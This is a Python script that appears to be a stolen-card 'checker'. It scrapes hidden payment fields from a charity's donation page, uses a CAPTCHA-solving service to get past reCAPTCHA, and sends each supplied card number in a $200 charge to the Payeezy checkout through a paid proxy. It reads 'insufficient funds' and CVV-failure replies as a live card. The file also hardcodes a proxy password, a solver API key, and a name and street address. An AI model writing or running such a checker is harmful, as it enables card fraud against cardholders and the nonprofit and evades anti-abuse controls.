import requests
import capsolver
import asyncio

CAPSOLVER_KEY = "CAP-6A109327964DEB86309B9891B1BF0590"
SITE_KEY = "6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y"

username = "pxu41397-0"
password = "St4RLt415RfrD1Rr83Lh"
ip = "x.botproxy.net"
puerto = "8080"
proxy = f"http://{username}:{password}@{ip}:{puerto}"
proxies = {
    "http://": proxy,
    "https://": proxy,
}

class CaptchaSolver:
    @staticmethod
    async def solve_v2(sitekey: str, url: str) -> str:
        try:
            capsolver.api_key = CAPSOLVER_KEY
            loop = asyncio.get_event_loop()
            solution = await loop.run_in_executor(
                None,
                lambda: capsolver.solve({
                    "type": "ReCaptchaV2TaskProxyLess", 
                    "websiteURL": url,
                    "websiteKey": sitekey,
                })
            )
            return solution.get("gRecaptchaResponse", "")
        except capsolver.error.UnknownError as e:
            print(f"UnknownError: Failed to solve the captcha: {e}")
            return ""
        except Exception as e:
            print(f"Error solving captcha: {e}")
            return ""

async def main(cc, mes, ano, cvv):
    try:
        session = requests.session()
        session.proxies.update(proxies)

        response = session.get('https://addictionservicescouncil.org/donate')

        xlogin = response.text.split('name="x_login" value="')[1].split('"')[0]
        xsecuence = response.text.split('name="x_fp_sequence" value="')[1].split('"')[0]
        xhash = response.text.split('name="x_fp_hash" value="')[1].split('"')[0]
        print(xlogin, xsecuence, xhash)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-ES,es;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://addictionservicescouncil.org',
            'referer': 'https://addictionservicescouncil.org/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        }

        data = {
            'x_login': xlogin,
            'x_show_form': 'PAYMENT_FORM',
            'x_fp_sequence': xsecuence,
            'x_fp_hash': xhash,
            'x_amount': '200',
            'x_currency_code': 'USD',
            'x_test_request': 'FALSE',
            'x_relay_response': '',
        }
        req2 = session.post('https://checkout.globalgatewaye4.firstdata.com/pay', headers=headers, data=data)

        captcha_response = await CaptchaSolver.solve_v2(SITE_KEY, 'https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1')

        if captcha_response:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/json; charset=UTF-8',
                'hcorequestsource': 'CloverHCO',
                'origin': 'https://checkout.globalgatewaye4.firstdata.com',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'cc_expiry': f"{mes}{ano[2:]}",
                'cardholder_name': 'josue lp',
                'cc_number': cc,
                'zip': '90640',
                'transaction_type': '00',
                'xlogin': xlogin,
                'hashKey': xhash,
                'amount': '200',
                'recaptchaToken': captcha_response,
                'address': {
                    'address1': '624 n wilcox ave',
                    'city': 'montebello',
                    'state': 'CA',
                    'country_code': 'USA',
                    'zip': '90640',
                },
                'cvd_presence_indicator': '9',
            }
            req3 = session.post(
                'https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1',
                headers=headers,
                json=json_data,
            )

            msg = req3.text
            try:
                exact_message = msg.split('"exact_message":"')[1].split('"')[0]
            except IndexError:
                exact_message = "No disponible"

            try:
                bank_message = msg.split('"bank_message":"')[1].split('"')[0]
            except IndexError:
                bank_message = "No disponible"

            try:
                if '"avs":"' in msg:
                    avs = msg.split('"avs":"')[1].split('"')[0]
                else:
                    avs = "No disponible"
            except IndexError:
                avs = "No disponible"

            if "Approved" in bank_message:
                status = "Approved ✅"
            elif "CVV2/VAK Failure" in bank_message:
                status = "Approved ✅"
            elif "Insufficient Funds" in bank_message:
                status = "Approved ✅"
            elif "Address not Verified" in msg:
                status = "Approved "
            else:
                status = "Declined ❌"

            return exact_message, avs, bank_message, status
        else:
            print("Failed to get a valid captcha response.")
            return "Captcha Error", "N/A", "N/A", "Declined ❌"
    except requests.exceptions.Timeout:
        return "Error: Timeout", "N/A", "N/A", "Declined ❌"
    except Exception as e:
        print(f"Error: {e}")
        return "Error", "N/A", "N/A", "Declined ❌"

async def payeezy(cc, mes, ano, cvv):
    return await main(cc, mes, ano, cvv)
